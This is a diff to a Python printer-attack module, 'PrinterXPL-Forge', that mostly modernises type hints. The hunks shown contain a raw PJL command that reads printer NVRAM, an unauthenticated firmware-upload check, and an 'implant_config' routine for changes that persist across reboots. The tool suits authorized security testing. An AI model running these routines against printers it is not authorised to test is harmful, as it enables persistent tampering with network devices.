@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 PrinterXPL-Forge — Firmware & Payload Module
 ==========================================
@@ -23,7 +22,6 @@ NOTE: All operations are implemented for authorized penetration testing only.
 # LinkedIn  : https://linkedin.com/in/mrhenrike
 # X/Twitter : https://x.com/mrhenrike
 
-from __future__ import annotations
 
 import logging
 import os
@@ -93,7 +91,7 @@ FIRMWARE_UPLOAD_PATHS = [
 
 def get_firmware_version(
     host: str, timeout: float = 8,
-) -> Dict[str, str]:
+) -> dict[str, str]:
     """
     Extract firmware version from all available sources.
 
@@ -184,7 +182,7 @@ def get_firmware_version(
 
 def check_firmware_upload(
     host: str, timeout: float = 10, verbose: bool = True,
-) -> Dict:
+) -> dict:
     """
     Test whether the printer's web interface accepts unauthenticated
     firmware upload requests.
@@ -437,7 +435,7 @@ def nvram_read(
     address: int   = 0,
     length:  int   = 256,
     timeout: float = 10,
-) -> Optional[bytes]:
+) -> bytes | None:
     """
     Read *length* bytes from printer NVRAM starting at *address* via PJL.
 
@@ -453,8 +451,8 @@ def nvram_read(
     UEL = b'\x1b%-12345X'
     cmd = (UEL
            + b'@PJL\r\n'
-           + '@PJL DMINFO ASCIIHEX\r\n'.encode()
-           + '@PJL DMCMD ASCIIHEX="0606000401"\r\n'.encode()  # read NV store
+           + b'@PJL DMINFO ASCIIHEX\r\n'
+           + b'@PJL DMCMD ASCIIHEX="0606000401"\r\n'  # read NV store
            + UEL)
     try:
         s = socket.create_connection((host, _raw_port), timeout=timeout)
@@ -601,7 +599,7 @@ def implant_config(
     snmp_community: str = '',
     timeout:   float = 10,
     verbose:   bool  = True,
-) -> Dict[str, bool]:
+) -> dict[str, bool]:
     """
     Attempt to implant configuration changes that survive reboots.
 
@@ -616,7 +614,7 @@ def implant_config(
 
     Returns dict of {config_key: success}.
     """
-    results: Dict[str, bool] = {}
+    results: dict[str, bool] = {}
 
     # 1. SNMP SET — community strings and system info
     if snmp_community or dns_server:
@@ -663,7 +661,7 @@ def firmware_audit(
     host:    str,
     timeout: float = 10,
     verbose: bool  = True,
-) -> Dict:
+) -> dict:
     """
     Run a comprehensive firmware security audit.
 
